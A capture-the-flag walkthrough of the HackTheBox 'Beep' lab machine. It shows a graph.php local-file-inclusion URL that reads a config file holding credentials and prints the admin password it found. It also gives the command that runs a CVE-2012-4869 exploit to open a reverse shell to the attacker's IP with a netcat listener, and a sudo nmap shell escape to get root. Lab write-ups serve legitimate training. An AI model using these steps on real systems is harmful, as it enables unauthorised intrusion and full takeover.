Bind machine IP to domain.

![[HackTheBox/Beep/images/1.png]]

Conduct port scan:

`sudo nmap -sV -sC beep.htb`

![[HackTheBox/Beep/images/2.png]]

`sudo nmap -sV -p- --max-rate 10000 beep.htb`

![[HackTheBox/Beep/images/3.png]]

Including `Login Page` and sounds interesting, I could not connect through port 80 or 443, but `nmap` highlights HTTPS.

Changing TLS version support worked in my browser. In Mozilla, go to `about:config`.

![[HackTheBox/Beep/images/4.png]]


![[HackTheBox/Beep/images/5.png]]

I found similar vulnerabilities, maybe `LFI` to reveal credentials of `elastix` and reverse shell via `CVE-2012-4869`.

![[HackTheBox/Beep/images/6.png]]


Use `Elastix 2.2.0 - 'graph.php' Local File Inclusion`

Remove the comment part of the exploit.

```pl
source: https://www.securityfocus.com/bid/55078/info

Elastix is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability to view files and execute local scripts in the context of the web server process. This may aid in further attacks.

Elastix 2.2.0 is vulnerable; other versions may also be affected. 
```


It did not work, but still I'll try manually.

![[HackTheBox/Beep/images/7.png]]

The manual approach ran successfully:

```pl
https://beep.htb/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```


![[HackTheBox/Beep/images/8.png]]

Let's try the creds:

On my initial attempt, `admin:jEhdIekWmdjE` creds authentication attempt accomplished.

Search `RCE` vector to obtain reverse shell call:

![[HackTheBox/Beep/images/9.png]]

This is what we need actually ->

[CVE-2012-4869](https://github.com/cyberdesu/Elastix-2.2.0-CVE-2012-4869)

Install `requests` library dependency:

```bash
python -m venv venv
source venv/bin/activate
pip install requests
nc -lvnp 3131 or penelope -p 3131
python exploit.py <URL> --LHOST <YOUR_IP> --LPORT <YOUR_PORT>
python exploit.py https://beep.htb --LHOST 10.10.16.64 --LPORT 3131
```

![[HackTheBox/Beep/images/10.png]]

In the other tab, I got a reverse shell connection via `penelope` shell handler.

![[HackTheBox/Beep/images/11.png]]

Observe that the auto shell upgrade completed via `python` binary.

Get `user` flag from `/home/fanis`:

![[HackTheBox/Beep/images/12.png]]

We have `fanis`, `root`, and `spamfilter` users.

![[HackTheBox/Beep/images/13.png]]

Normally, in the recent labs I encountered a condition where almost every `sudo -l` attempt required me to input a password of the user, but for this user `asterisk` I did not see such thing, so let's abuse `GTFOBins`.

![[HackTheBox/Beep/images/14.png]]

In this scenario, I tried to exploit `nmap` binary.

```bash
sudo nmap --interactive
!/bin/sh
```

![[HackTheBox/Beep/images/15.png]]

`cat /root/root.txt`.

![[HackTheBox/Beep/images/16.png]]